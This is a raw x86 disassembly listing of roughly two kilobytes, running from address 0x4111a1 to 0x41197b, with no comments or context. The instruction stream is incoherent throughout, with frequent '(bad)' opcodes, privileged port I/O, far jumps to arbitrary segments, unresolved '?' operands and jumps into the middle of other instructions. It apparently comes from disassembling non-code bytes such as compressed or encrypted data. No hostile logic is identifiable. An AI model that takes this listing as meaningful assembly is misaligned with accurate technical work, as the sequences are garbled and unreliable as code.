  4111a1:	cmp    eax,0x22e54ebd
  4111a6:	gs jb  0x411228
  4111a9:	adc    dl,BYTE PTR ds:0x17442094
  4111af:	ss pop edi
  4111b1:	inc    ecx
  4111b2:	jns    0x41116e
  4111b4:	lods   al,BYTE PTR ds:[esi]
  4111b5:	frstor [ebx]
  4111b7:	icebp  
  4111b8:	mov    bh,0xd5
  4111ba:	xchg   DWORD PTR [eax],ebp
  4111bc:	or     ah,BYTE PTR [esi]
  4111be:	dec    ebp
  4111bf:	(bad)  
  4111c0:	and    bl,BYTE PTR [ebp-0x6]
  4111c3:	xor    al,dl
  4111c5:	jle    0x411172
  4111c7:	icebp  
  4111c8:	xor    dl,BYTE PTR [ecx]
  4111ca:	inc    esi
  4111cb:	mov    ebx,0xcb401f47
  4111d0:	out    dx,eax
  4111d1:	xchg   ecx,eax
  4111d2:	or     DWORD PTR [edi],ebx
  4111d4:	aad    0xd8
  4111d6:	out    dx,al
  4111d7:	out    0x21,al
  4111d9:	ins    BYTE PTR es:[edi],dx
  4111da:	jecxz  0x4111eb
  4111dc:	mov    dh,0x68
  4111de:	sub    dh,bh
  4111e0:	xchg   esi,eax
  4111e1:	lock and eax,0xa53ef94f
  4111e7:	scas   eax,DWORD PTR es:[edi]
  4111e8:	inc    ebp
  4111e9:	mov    WORD PTR [edx],?
  4111eb:	jnp    0x41125f
  4111ed:	iret   
  4111ee:	mov    bl,dl
  4111f0:	mov    ds:0x309a6dc2,eax
  4111f5:	es inc esi
  4111f7:	(bad)  
  4111f8:	sbb    esi,esp
  4111fa:	jmp    0xb411:0x5f3436f8
  411201:	rcl    BYTE PTR [ebp-0x56],cl
  411204:	fwait
  411205:	pop    ds
  411206:	pushf  
  411207:	enter  0xdc97,0xa9
  41120b:	push   esp
  41120c:	inc    eax
  41120d:	js     0x4111cd
  41120f:	sar    BYTE PTR [edi+0x67c204f4],0x7e
  411216:	cmc    
  411217:	mov    bh,0xd8
  411219:	aaa    
  41121a:	cmp    ch,BYTE PTR [edi-0x1fd44236]
  411220:	mov    ch,0xf9
  411222:	ins    BYTE PTR es:[edi],dx
  411223:	mov    al,ds:0xa6b26a05
  411228:	or     al,0x9e
  41122a:	arpl   WORD PTR [edi-0x36045b],di
  411230:	(bad)  [ebp+0x6f]
  411233:	scas   al,BYTE PTR es:[edi]
  411234:	mov    esi,0x30a11496
  411239:	xor    eax,0x49b0751e
  41123e:	mov    cl,0xd6
  411240:	ds push eax
  411242:	dec    edi
  411243:	(bad)  
  411245:	jo     0x411203
  411247:	rcl    DWORD PTR [eax+0x4aa489f1],cl
  41124d:	out    0xd6,al
  41124f:	xor    ecx,DWORD PTR [edx+0x2b8b9c89]
  411255:	pop    ds
  411256:	xor    esp,DWORD PTR ss:[edi]
  411259:	mov    DWORD PTR [eax+0x1e],0xd50511aa
  411260:	out    dx,eax
  411261:	jecxz  0x411228
  411263:	fnstenv [ebp+eiz*2+0x3d190918]
  41126a:	add    ch,cl
  41126c:	bnd jno 0x41123b
  41126f:	cmp    dh,ah
  411271:	mov    dh,0xa0
  411273:	inc    edi
  411274:	cmp    bh,BYTE PTR [edx-0x30]
  411277:	push   ebp
  411278:	mov    ebx,0x96297810
  41127d:	adc    BYTE PTR [ebx+ebx*2],cl
  411280:	inc    ebx
  411281:	add    ch,BYTE PTR [ebx+0x71ccfb94]
  411287:	jg     0x4112ae
  411289:	repz mov al,ds:0x569d295d
  41128f:	adc    al,0xa2
  411291:	js     0x4112af
  411293:	cmp    eax,0xf6b805cf
  411298:	adc    al,0xaf
  41129a:	sub    cl,BYTE PTR [edx]
  41129c:	mov    bl,0xa5
  41129e:	dec    ebp
  41129f:	and    DWORD PTR [esi+edx*8+0x6e],edx
  4112a3:	sub    eax,0xd84cb2fe
  4112a8:	mov    edi,0xf809277c
  4112ad:	jg     0x411302
  4112af:	jnp    0x4112bd
  4112b1:	mov    eax,0x35ff9b1d
  4112b6:	imul   ebx,DWORD PTR es:[eax+0x39],0x4e
  4112bb:	ins    BYTE PTR es:[edi],dx
  4112bc:	push   ss
  4112bd:	cmp    esp,ecx
  4112bf:	mov    edi,0x2e86dcb3
  4112c4:	(bad)  
  4112c6:	and    BYTE PTR [edx],dh
  4112c8:	jo     0x41125e
  4112ca:	shl    BYTE PTR [edi],cl
  4112cc:	into   
  4112cd:	cmp    DWORD PTR [edx],esi
  4112cf:	adc    eax,0xa52b3658
  4112d4:	jge    0x41132e
  4112d6:	ss call 0xa7c5:0x56d8c0cc
  4112de:	sub    DWORD PTR ds:0x59797de5,edx
  4112e4:	jmp    0x411282
  4112e6:	scas   eax,DWORD PTR es:[edi]
  4112e7:	iret   
  4112e8:	aad    0x66
  4112ea:	clc    
  4112eb:	sub    DWORD PTR [edi-0x12],ebx
  4112ee:	mov    al,ds:0x3d772fdf
  4112f3:	mov    WORD PTR [ebx+ecx*4+0xd],?
  4112f7:	pop    esi
  4112f8:	jmp    0x41134a
  4112fa:	push   cs
  4112fb:	fimul  DWORD PTR [edx-0x7d]
  4112fe:	adc    al,0x1
  411300:	sbb    BYTE PTR [ecx+0x8dd1373],cl
  411306:	inc    edx
  411307:	xor    DWORD PTR [ecx+eiz*8],edx
  41130a:	sub    DWORD PTR [ebx+eax*1-0x51],ecx
  41130e:	fstp   DWORD PTR [ebx-0x39]
  411311:	enter  0x1686,0x81
  411315:	adc    DWORD PTR [eax],edi
  411317:	pop    ecx
  411318:	dec    esp
  411319:	std    
  41131a:	sbb    edi,DWORD PTR [edi+0x5b]
  41131d:	push   0xffffffac
  41131f:	adc    DWORD PTR [ebp+edi*1+0x55],eax
  411323:	push   esi
  411324:	clc    
  411325:	test   BYTE PTR [ecx-0x516cb768],dl
  41132b:	sub    ah,BYTE PTR ds:0xe6c2553d
  411331:	add    eax,0xd8a5c8c7
  411336:	stos   BYTE PTR es:[edi],al
  411337:	(bad)  
  411338:	jl     0x41139a
  41133a:	mov    al,0xb6
  41133c:	mov    esp,DWORD PTR [edx+0x5f3f3c8e]
  411342:	jbe    0x411337
  411344:	mov    ah,0xb1
  411346:	jl     0x411366
  411348:	cmp    eax,0xbfcad306
  41134d:	imul   eax,DWORD PTR [esi+0x77],0x7a
  411351:	ss jge 0x411312
  411354:	outs   dx,BYTE PTR ds:[esi]
  411355:	inc    ecx
  411356:	stos   BYTE PTR es:[edi],al
  411357:	mov    ah,0xf1
  411359:	test   al,bl
  41135b:	leave  
  41135c:	cmp    al,0x27
  41135e:	mov    fs,WORD PTR [eax+0x51b50de6]
  411364:	out    0x8e,eax
  411366:	inc    ebx
  411367:	ins    DWORD PTR es:[edi],dx
  411368:	sub    eax,0x74efd38d
  41136d:	jns    0x411319
  41136f:	mov    ecx,0x1cb7e478
  411374:	cs int3 
  411376:	cwd    
  411378:	(bad)  
  411379:	sbb    ch,dh
  41137b:	sbb    BYTE PTR [ebp-0x720df86],0x4d
  411382:	mov    al,0x73
  411384:	add    al,0xdb
  411386:	add    ecx,DWORD PTR [ecx-0x636e33da]
  41138c:	xor    eax,0x782fa982
  411391:	aad    0xb0
  411393:	or     bh,al
  411395:	mov    ebx,0xd44931f6
  41139a:	cmp    al,0x66
  41139c:	jb     0x411380
  41139e:	cmp    bl,bh
  4113a0:	push   ebp
  4113a1:	das    
  4113a2:	cmc    
  4113a3:	jae    0x41139c
  4113a5:	mov    esp,0x37e94d65
  4113aa:	jp     0x411429
  4113ac:	daa    
  4113ad:	pop    edi
  4113ae:	mov    bl,0xc3
  4113b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113b1:	dec    ecx
  4113b2:	or     DWORD PTR [esp+edi*8-0x3a],0xb4c1c978
  4113ba:	in     al,dx
  4113bb:	xor    esi,ebx
  4113bd:	adc    BYTE PTR [eax],bh
  4113bf:	rol    DWORD PTR [ecx-0x78c13a8e],cl
  4113c5:	out    dx,eax
  4113c6:	out    0x58,eax
  4113c8:	mov    BYTE PTR [edi+0x6c71bc91],ah
  4113ce:	addr16 repnz dec ecx
  4113d1:	rol    DWORD PTR [ebx+ebx*8],cl
  4113d4:	das    
  4113d5:	fidiv  WORD PTR ds:0x58d4f0cb
  4113db:	jge    0x4113d8
  4113dd:	dec    esi
  4113de:	in     eax,dx
  4113df:	xor    eax,0x33ae596e
  4113e4:	les    esi,FWORD PTR [edx-0x1c]
  4113e7:	call   FWORD PTR [eax-0x480868c7]
  4113ed:	jo     0x41138f
  4113ef:	cdq    
  4113f0:	xchg   esp,eax
  4113f1:	(bad)  
  4113f2:	lock mov bh,0x5
  4113f5:	xchg   ebp,eax
  4113f6:	outs   dx,DWORD PTR ds:[esi]
  4113f7:	repz fs cmp ecx,ebp
  4113fb:	xchg   ecx,eax
  4113fc:	fucomip st,st(4)
  4113fe:	push   ebx
  4113ff:	lock cmp BYTE PTR [ebp-0x5e58a3d6],ch
  411406:	retf   
  411407:	sbb    eax,0x8a00cf1f
  41140c:	fdivr  QWORD PTR [ecx+0x6d]
  41140f:	test   eax,0x222c4910
  411414:	mov    ecx,0xfba4aaad
  411419:	ins    DWORD PTR es:[edi],dx
  41141a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141b:	iret   
  41141c:	je     0x4113f6
  41141e:	fsubr  QWORD PTR [eax+0x2b]
  411421:	sub    BYTE PTR [edx-0x67f56ced],ah
  411427:	or     dl,BYTE PTR [esi]
  411429:	adc    eax,0x79d375c4
  41142e:	xchg   esi,eax
  41142f:	dec    eax
  411430:	mov    al,0x8d
  411432:	cmp    edx,DWORD PTR ds:0xbccd511a
  411438:	popf   
  411439:	and    BYTE PTR [ecx+0x3f],dl
  41143c:	inc    edx
  41143d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41143e:	std    
  41143f:	cwde   
  411440:	jge    0x4113f4
  411442:	call   0xbad8:0x475e7fa6
  411449:	push   0x2b
  41144b:	xchg   ecx,eax
  41144c:	mov    DWORD PTR [esi+ecx*4],ecx
  41144f:	mov    esi,0x8e81a5d3
  411454:	mov    ebp,0xb846d254
  411459:	in     eax,0x9d
  41145b:	fidivr DWORD PTR ds:0x7f95631f
  411461:	jnp    0x4114e1
  411463:	mov    al,0x46
  411465:	push   ss
  411466:	mov    bl,0xe0
  411468:	das    
  411469:	mov    ds:0xca80366,eax
  41146e:	clc    
  41146f:	push   esp
  411470:	lahf   
  411471:	mov    ds:0x83266c28,eax
  411476:	pop    es
  411477:	add    eax,0xaa563797
  41147c:	rol    BYTE PTR [ebx+ebp*1],0x35
  411480:	(bad)  
  411481:	fsub   QWORD PTR [edx+0x67]
  411484:	pop    ebx
  411485:	hlt    
  411486:	push   esi
  411487:	push   ds
  411488:	xchg   DWORD PTR [edi],edx
  41148a:	inc    BYTE PTR [ecx-0x5db8bd13]
  411490:	xchg   dh,ah
  411492:	test   DWORD PTR [ebx],ecx
  411494:	jae    0x4114c5
  411496:	jmp    0x411453
  411498:	mov    edx,0xa5bc2465
  41149d:	xchg   ecx,eax
  41149e:	dec    edi
  41149f:	enter  0xc2fa,0xf6
  4114a3:	mov    eax,ds:0xaddb1fcb
  4114a8:	sbb    ebp,eax
  4114aa:	add    al,0xa
  4114ac:	lock imul edi,DWORD PTR [ebx-0x18507bea],0xffffffea
  4114b4:	(bad)  
  4114b5:	mov    ebp,0x5cdc4f49
  4114ba:	cwde   
  4114bb:	js     0x4114a1
  4114bd:	in     eax,0x20
  4114bf:	add    BYTE PTR [ebx+edx*4-0x22],0x9a
  4114c4:	jecxz  0x411482
  4114c6:	inc    ebp
  4114c7:	enter  0x634d,0x78
  4114cb:	jo     0x411530
  4114cd:	push   ebp
  4114ce:	sbb    BYTE PTR [ebx+0x1f],cl
  4114d1:	daa    
  4114d2:	hlt    
  4114d3:	sbb    DWORD PTR [edx+0x8],eax
  4114d6:	dec    edi
  4114d7:	pop    ecx
  4114d8:	fistp  QWORD PTR [edx-0x778dae02]
  4114de:	xchg   ebp,eax
  4114df:	cwde   
  4114e0:	dec    ecx
  4114e1:	jo     0x41154d
  4114e3:	pop    ebx
  4114e4:	jno    0x4114b2
  4114e6:	sbb    eax,edi
  4114e8:	jo     0x41155a
  4114ea:	fsubr  DWORD PTR [eax]
  4114ec:	push   ecx
  4114ed:	aas    
  4114ee:	and    al,0x58
  4114f0:	(bad)  
  4114f1:	imul   ebp,DWORD PTR ds:0xd6f4fdcf,0xffffffee
  4114f8:	out    dx,eax
  4114f9:	imul   eax,DWORD PTR [edx],0x5dd40562
  4114ff:	and    al,0xde
  411501:	test   eax,0xdc19f9b8
  411506:	fwait
  411507:	in     eax,dx
  411508:	push   0xffffffed
  41150a:	add    al,0xfe
  41150c:	nop
  41150d:	push   ds
  41150e:	aas    
  41150f:	inc    edx
  411510:	push   0x55
  411512:	clc    
  411513:	mov    DWORD PTR [ebp+0x1de8bde3],edx
  411519:	sti    
  41151a:	mov    edx,0x5bfb4c78
  41151f:	xchg   esi,eax
  411520:	pop    ecx
  411521:	lock xchg esp,eax
  411523:	aas    
  411524:	mov    ebp,0xfa54f6c6
  411529:	nop
  41152a:	inc    esi
  41152b:	inc    esp
  41152c:	xchg   ecx,eax
  41152d:	xor    eax,0xa7d3cff3
  411532:	fbstp  TBYTE PTR [edx]
  411534:	cwde   
  411535:	enter  0x6c3f,0x79
  411539:	(bad)  
  41153a:	jmp    FWORD PTR [ebx-0x15]
  41153d:	sbb    DWORD PTR [ebx],eax
  41153f:	push   esp
  411540:	mov    esp,0x43f33590
  411545:	nop
  411546:	es loopne 0x4115b2
  411549:	xor    esi,ecx
  41154b:	aas    
  41154c:	xchg   esi,eax
  41154d:	popa   
  41154e:	pop    ebp
  41154f:	iret   
  411550:	and    al,0xa8
  411552:	dec    ebp
  411553:	and    ah,bl
  411555:	lds    edx,FWORD PTR [eax+0x5b]
  411558:	push   0xffffffe3
  41155a:	cmp    al,ah
  41155c:	lock sub DWORD PTR ds:0x49f9e717,edx
  411563:	je     0x41157c
  411565:	pop    ecx
  411566:	push   ebx
  411567:	mov    cl,0x93
  411569:	popa   
  41156a:	jp     0x4115e6
  41156c:	daa    
  41156d:	cld    
  41156e:	fild   DWORD PTR ds:0x76d34f5d
  411574:	sbb    edx,DWORD PTR [ebx+0x70]
  411577:	add    ecx,DWORD PTR [ecx+0x3b8ae23e]
  41157d:	repz sub dh,ah
  411580:	jl     0x4115b5
  411582:	pusha  
  411583:	leave  
  411584:	xor    eax,0x504c2210
  411589:	lock dec ecx
  41158b:	dec    ebp
  41158c:	scas   eax,DWORD PTR es:[edi]
  41158d:	iret   
  41158e:	jecxz  0x41160b
  411590:	into   
  411591:	xchg   esi,eax
  411592:	adc    al,BYTE PTR [eax]
  411594:	dec    ebx
  411595:	jecxz  0x41158d
  411597:	or     bh,ch
  411599:	push   esp
  41159a:	fidiv  WORD PTR [ecx]
  41159c:	retf   0x67e2
  41159f:	mov    al,ds:0x13c4a528
  4115a4:	ins    DWORD PTR es:[edi],dx
  4115a5:	xchg   ecx,eax
  4115a6:	or     ah,ch
  4115a8:	dec    ebx
  4115a9:	dec    DWORD PTR [edx]
  4115ab:	into   
  4115ac:	leave  
  4115ad:	test   BYTE PTR [esi+ebx*4+0x4b89ffca],dl
  4115b4:	imul   esp,DWORD PTR [ebp+ebp*1-0x30f33114],0xffffffd1
  4115bc:	sbb    al,0x84
  4115be:	jmp    0x92b8:0x2302473a
  4115c5:	fwait
  4115c6:	mov    eax,0x404f2cf3
  4115cb:	stc    
  4115cc:	mov    ebx,0x85fd2059
  4115d1:	int3   
  4115d2:	dec    edx
  4115d3:	xchg   BYTE PTR [edx+0x7d8cd453],bh
  4115d9:	jmp    0x411578
  4115db:	jl     0x4115c1
  4115dd:	pop    edx
  4115de:	sar    BYTE PTR [ecx+0x5647d6a8],1
  4115e4:	gs xchg esp,eax
  4115e6:	mov    WORD PTR [edx+ebx*1],fs
  4115e9:	outs   dx,BYTE PTR ds:[esi]
  4115ea:	push   ebp
  4115eb:	gs std 
  4115ed:	cs jge 0x4115f4
  4115f0:	outs   dx,BYTE PTR ds:[esi]
  4115f1:	retf   
  4115f2:	push   eax
  4115f3:	stos   DWORD PTR es:[edi],eax
  4115f4:	jnp    0x41158a
  4115f6:	sbb    eax,0x211bad7
  4115fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fc:	pop    es
  4115fd:	scas   al,BYTE PTR es:[edi]
  4115fe:	jns    0x411633
  411600:	mov    eax,ds:0x3276f6c5
  411605:	bound  ebx,QWORD PTR [eax]
  411607:	in     eax,dx
  411608:	add    DWORD PTR [eax+0x35],eax
  41160b:	or     DWORD PTR [eax+0x1ffc50f5],eax
  411611:	lea    esi,[esi+0x736a582e]
  411617:	gs loopne 0x4115f9
  41161a:	push   edx
  41161b:	sbb    dh,BYTE PTR [edi-0x70d2f2bc]
  411621:	push   edx
  411622:	je     0x4115a9
  411624:	sub    DWORD PTR [edx+0x5b],ebx
  411627:	or     BYTE PTR [ebx+0x76],0x51
  41162b:	sahf   
  41162c:	xchg   DWORD PTR [eax-0x27],eax
  41162f:	cmp    bh,ch
  411631:	push   0x778cb3e8
  411636:	aad    0x53
  411638:	int3   
  411639:	repz push cs
  41163b:	cld    
  41163c:	hlt    
  41163d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41163e:	jnp    0x411687
  411640:	outs   dx,DWORD PTR ds:[esi]
  411641:	mov    edx,DWORD PTR [ebx+ecx*2]
  411644:	jno    0x4115db
  411646:	mov    WORD PTR [edx],?
  411648:	daa    
  411649:	sub    edx,DWORD PTR [ebp+0x399f6c90]
  41164f:	pusha  
  411650:	jl     0x411624
  411652:	adc    ch,ch
  411654:	cli    
  411655:	xor    esp,DWORD PTR [esi+eiz*4+0x75]
  411659:	(bad)  
  41165a:	in     al,dx
  41165b:	(bad)  
  41165c:	leave  
  41165d:	aam    0x5c
  41165f:	jmp    0xd95a3864
  411664:	mov    DWORD PTR [edx+0x7f],esp
  411667:	dec    ebx
  411668:	push   eax
  411669:	cmp    ch,BYTE PTR [esi+0x47]
  41166c:	add    ah,BYTE PTR [ebx]
  41166e:	out    0xc8,al
  411670:	mov    ?,WORD PTR [esi+0x6f]
  411673:	xor    al,BYTE PTR [eax]
  411675:	(bad)  
  411676:	sbb    BYTE PTR [ebx],dl
  411678:	lock jo 0x41161c
  41167b:	jae    0x411694
  41167d:	jne    0x411645
  41167f:	adc    bl,BYTE PTR [edi]
  411681:	fld    TBYTE PTR [esi-0x63c17584]
  411687:	mov    ah,0xf3
  411689:	ror    DWORD PTR [edx-0xc],cl
  41168c:	sub    DWORD PTR [edi-0x64be596d],edx
  411692:	jnp    0x4116db
  411694:	push   edx
  411695:	outs   dx,BYTE PTR ds:[esi]
  411696:	push   ecx
  411697:	mov    esp,DWORD PTR ds:0x7b21951d
  41169d:	shr    DWORD PTR [edx+edi*4-0x6b46bea2],0xf8
  4116a5:	pop    eax
  4116a6:	test   BYTE PTR [edx],dl
  4116a8:	(bad)  
  4116a9:	push   ds
  4116aa:	add    al,0x43
  4116ac:	fimul  DWORD PTR [edx-0x5fe4b199]
  4116b2:	jg     0x4116d6
  4116b4:	shl    DWORD PTR [ebx+0x41],0xaf
  4116b8:	loopne 0x4116a6
  4116ba:	inc    ecx
  4116bb:	cdq    
  4116bc:	scas   eax,DWORD PTR es:[edi]
  4116bd:	mov    edi,0xf998867
  4116c2:	loopne 0x41168a
  4116c4:	rol    BYTE PTR [ecx],cl
  4116c6:	push   0x5d6c622e
  4116cb:	test   BYTE PTR [eax+0x4],bh
  4116ce:	(bad)  
  4116cf:	scas   eax,DWORD PTR es:[edi]
  4116d0:	mov    esi,0xb611edce
  4116d5:	xor    BYTE PTR [ebp-0x46],0x75
  4116d9:	add    DWORD PTR [edx-0x53],ebp
  4116dc:	inc    ecx
  4116dd:	add    eax,0x621d20c5
  4116e2:	jmp    0xfc91b5f2
  4116e7:	std    
  4116e8:	push   es
  4116e9:	xor    DWORD PTR [ebx+0x4e7259ba],esi
  4116ef:	loop   0x411745
  4116f1:	(bad)  
  4116f2:	mov    ds:0xad23301e,eax
  4116f7:	push   edx
  4116f8:	hlt    
  4116f9:	jo     0x4116ff
  4116fb:	sbb    esp,esp
  4116fd:	jmp    0x1e1d1d0f
  411702:	ja     0x41175f
  411704:	cmp    ch,BYTE PTR [esi]
  411706:	push   ds
  411707:	clc    
  411708:	not    esp
  41170a:	fst    QWORD PTR [edx]
  41170c:	lock and BYTE PTR [ebx+edi*8-0x438740],0x18
  411715:	cdq    
  411716:	adc    DWORD PTR [esi-0x1f055e84],0xafc5991a
  411720:	sub    ah,ch
  411722:	aaa    
  411723:	adc    edi,DWORD PTR [eax+0x1adee8c2]
  411729:	call   0x3f45:0x1f393e6d
  411730:	fs out 0x4a,al
  411733:	and    eax,0xb3a0680c
  411738:	jle    0x41172e
  41173a:	push   ecx
  41173b:	or     bh,BYTE PTR [eax]
  41173d:	sbb    esp,edi
  41173f:	cwde   
  411740:	jns    0x411740
  411742:	fsub   DWORD PTR [ebx-0x359c7933]
  411748:	loopne 0x411726
  41174a:	inc    ebp
  41174b:	pop    ss
  41174c:	mov    edx,0xf06b3a32
  411751:	jbe    0x411766
  411753:	gs jmp 0x4116d8
  411756:	idiv   BYTE PTR [esi+0x29621329]
  41175c:	jnp    0x411746
  41175e:	test   DWORD PTR [ebx+0x12],ebp
  411761:	pushf  
  411762:	or     al,0x70
  411764:	inc    ebx
  411765:	imul   BYTE PTR [ecx+0x7d]
  411768:	sub    eax,0x5d426eb0
  41176d:	dec    ecx
  41176e:	cs xchg esi,eax
  411770:	pop    esp
  411771:	jae    0x4117ec
  411773:	aad    0xdb
  411775:	sub    esi,ecx
  411777:	sub    edi,DWORD PTR [edi]
  411779:	aas    
  41177a:	ins    DWORD PTR es:[edi],dx
  41177b:	or     cl,dl
  41177d:	sbb    al,0x4d
  41177f:	mov    al,ds:0x2a1065c3
  411784:	sub    eax,0xe33d8098
  411789:	pusha  
  41178a:	mov    dl,0x26
  41178c:	pop    ebp
  41178d:	inc    BYTE PTR [ebx]
  41178f:	gs leave 
  411791:	xchg   ebx,eax
  411792:	(bad)  
  411793:	cmp    ch,BYTE PTR [edi]
  411795:	jg     0x41174d
  411797:	into   
  411798:	lahf   
  411799:	into   
  41179a:	xchg   edx,eax
  41179b:	out    dx,al
  41179c:	jp     0x411817
  41179e:	int    0xb4
  4117a0:	mov    dl,0x2
  4117a2:	idiv   BYTE PTR ds:0x731920f2
  4117a8:	mov    ?,WORD PTR [ebp+0x5b]
  4117ab:	xchg   ebx,eax
  4117ac:	jle    0x4117ba
  4117ae:	dec    ecx
  4117af:	or     ecx,DWORD PTR ds:0x3f25d397
  4117b5:	cmp    DWORD PTR [esi-0x56b051fc],ecx
  4117bb:	jg     0x411823
  4117bd:	xchg   edi,eax
  4117be:	dec    edx
  4117bf:	sahf   
  4117c0:	imul   edx,DWORD PTR [ebp-0x1c],0x4604e883
  4117c7:	xchg   ah,dl
  4117c9:	imul   edi,DWORD PTR [edx+0x1f],0x9c2edff6
  4117d0:	cmp    BYTE PTR [edi-0x20f9b9b6],al
  4117d6:	jns    0x41177e
  4117d8:	mov    ecx,edi
  4117da:	ret    0x8fe8
  4117dd:	retf   0xbeca
  4117e0:	(bad)  
  4117e1:	mov    esp,0xfbbdd675
  4117e6:	leave  
  4117e7:	sbb    BYTE PTR ds:0xd4a3212b,ah
  4117ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ee:	xchg   edi,eax
  4117ef:	adc    BYTE PTR [ebp-0x13d8fd24],cl
  4117f5:	dec    ebp
  4117f6:	inc    esi
  4117f7:	adc    esi,DWORD PTR [edi+0x42dcb77a]
  4117fd:	jbe    0x41184e
  4117ff:	cmp    edx,DWORD PTR [ecx+0x5c09b108]
  411805:	pop    esi
  411806:	in     eax,dx
  411807:	imul   edi,DWORD PTR [esi],0x71fe20b8
  41180d:	outs   dx,DWORD PTR ds:[esi]
  41180e:	add    bl,BYTE PTR [ecx]
  411810:	jbe    0x41184d
  411812:	imul   edi,DWORD PTR [ecx+0x11],0x97a5093e
  411819:	inc    ebp
  41181a:	test   BYTE PTR [ecx-0x72f4c880],0xef
  411821:	aaa    
  411822:	xchg   BYTE PTR ds:0xea1c9c5a,dl
  411828:	mov    al,0xec
  41182a:	aam    0x4a
  41182c:	mov    es,WORD PTR [edx]
  41182e:	adc    bl,dh
  411830:	in     eax,dx
  411831:	inc    ebp
  411832:	lock mov BYTE PTR [ebx-0x18],bh
  411836:	mov    esi,0xd198115d
  41183b:	mov    DWORD PTR [ecx],esi
  41183d:	mov    BYTE PTR [edx-0xb],0x5d
  411841:	inc    edx
  411842:	fild   QWORD PTR [eax]
  411844:	fs popf 
  411846:	jg     0x411828
  411848:	sub    eax,0x756a8e1f
  41184d:	ins    DWORD PTR es:[edi],dx
  41184e:	push   ss
  41184f:	pop    eax
  411850:	pop    ebx
  411851:	int3   
  411852:	sbb    edi,DWORD PTR [edx+0xf]
  411855:	popa   
  411856:	jmp    0x41182a
  411858:	aaa    
  411859:	in     al,0x42
  41185b:	pop    edi
  41185c:	inc    ebp
  41185d:	js     0x411847
  41185f:	jmp    0xd4937e09
  411864:	clc    
  411865:	aam    0x68
  411867:	adc    DWORD PTR [ebx],0x720cfce5
  41186d:	repz mov ah,0xb9
  411870:	sbb    edx,0xffffffb7
  411873:	clc    
  411874:	sti    
  411875:	fisubr DWORD PTR [ecx]
  411877:	mov    ch,0x69
  411879:	inc    ebx
  41187a:	ja     0x411811
  41187c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41187d:	cmp    edx,ecx
  41187f:	mov    ecx,0xdeefa492
  411884:	mov    dl,0x2d
  411886:	xchg   bl,ah
  411888:	call   0x36bd40da
  41188d:	arpl   WORD PTR [esi],bp
  41188f:	adc    BYTE PTR [edi],bh
  411891:	jns    0x411856
  411893:	inc    esi
  411894:	lods   eax,DWORD PTR ds:[esi]
  411895:	repnz pop ds
  411897:	sub    DWORD PTR [ecx-0x1f],edx
  41189a:	idiv   DWORD PTR [ebx+0x543fe616]
  4118a0:	jle    0x411874
  4118a2:	adc    esp,DWORD PTR [eax]
  4118a4:	retf   
  4118a5:	hlt    
  4118a6:	test   al,0x64
  4118a8:	pushf  
  4118a9:	int3   
  4118aa:	ins    BYTE PTR es:[edi],dx
  4118ab:	cmp    ebx,edx
  4118ad:	aas    
  4118ae:	or     bh,BYTE PTR [edx]
  4118b0:	inc    ecx
  4118b1:	inc    ebx
  4118b2:	jge    0x41187d
  4118b4:	push   ss
  4118b5:	mov    BYTE PTR [eax-0x57],cl
  4118b8:	jno    0x411886
  4118ba:	scas   al,BYTE PTR es:[edi]
  4118bb:	jmp    0x411865
  4118bd:	jg     0x4118fe
  4118bf:	ror    BYTE PTR [eax+edi*2-0x43715e8d],1
  4118c6:	jbe    0x41190c
  4118c8:	dec    ebx
  4118c9:	sbb    ebx,DWORD PTR [si+0x35]
  4118cd:	xor    ebx,DWORD PTR [edx+0x4a]
  4118d0:	sbb    bl,BYTE PTR [edx+0x30b57265]
  4118d6:	popf   
  4118d7:	shl    DWORD PTR [eax-0x53b956a2],1
  4118dd:	adc    edx,0x2cab35c
  4118e3:	jecxz  0x411935
  4118e5:	std    
  4118e6:	mov    DWORD PTR [eax-0x5304a222],ecx
  4118ec:	call   0xbc007365
  4118f1:	cmp    eax,0x95a8d417
  4118f6:	or     ch,bh
  4118f8:	or     eax,0x54c5b7cf
  4118fd:	xchg   ebx,eax
  4118fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118ff:	inc    ecx
  411900:	cld    
  411901:	push   0x6c2afa95
  411906:	sbb    BYTE PTR [edx+0xde74ff0],ah
  41190c:	stc    
  41190d:	out    0x3c,al
  41190f:	sahf   
  411910:	ins    BYTE PTR es:[edi],dx
  411911:	inc    edx
  411912:	in     al,0xe9
  411914:	xchg   DWORD PTR [ebx-0x78],esi
  411917:	dec    ebx
  411918:	pushf  
  411919:	test   ah,al
  41191b:	xlat   BYTE PTR ds:[ebx]
  41191c:	(bad)  
  41191d:	sar    DWORD PTR [esi],1
  41191f:	adc    BYTE PTR [eax-0x1f],bl
  411922:	lods   al,BYTE PTR ds:[esi]
  411923:	xor    ah,bh
  411925:	lds    ebp,FWORD PTR ds:0xcb08c535
  41192b:	les    edi,FWORD PTR [ebx+eiz*2]
  41192e:	jge    0x411921
  411930:	or     DWORD PTR [eax+0x25],0xffffffa6
  411934:	cmp    bh,BYTE PTR [edi+0x4f]
  411937:	adc    al,0xe0
  411939:	sub    al,0x35
  41193b:	push   edx
  41193c:	pop    esi
  41193d:	pop    ss
  41193e:	or     DWORD PTR [eax-0x6b],ecx
  411941:	mov    al,ds:0xb98dbc1c
  411946:	sub    eax,0x392704ab
  41194b:	pop    edi
  41194c:	pop    ebx
  41194d:	pop    eax
  41194e:	scas   eax,DWORD PTR es:[edi]
  41194f:	mov    edi,0x36057942
  411954:	mov    dh,0xad
  411956:	push   ecx
  411957:	cmp    ah,ch
  411959:	pop    ss
  41195a:	into   
  41195b:	push   esi
  41195c:	test   bl,al
  41195e:	lods   al,BYTE PTR ds:[esi]
  41195f:	dec    eax
  411960:	push   es
  411961:	inc    eax
  411962:	into   
  411963:	xchg   edi,eax
  411964:	das    
  411965:	sar    DWORD PTR [ebx],cl
  411967:	arpl   WORD PTR [edi-0x30],si
  41196a:	mov    cl,0xbf
  41196c:	xchg   edx,eax
  41196d:	jns    0x411933
  41196f:	cld    
  411970:	loop   0x4119be
  411972:	mov    cl,al
  411974:	xchg   esi,eax
  411975:	outs   dx,DWORD PTR ds:[esi]
  411976:	jle    0x4119dd
  411978:	dec    ecx
  411979:	sbb    al,0x16
  41197b:	(bad)  
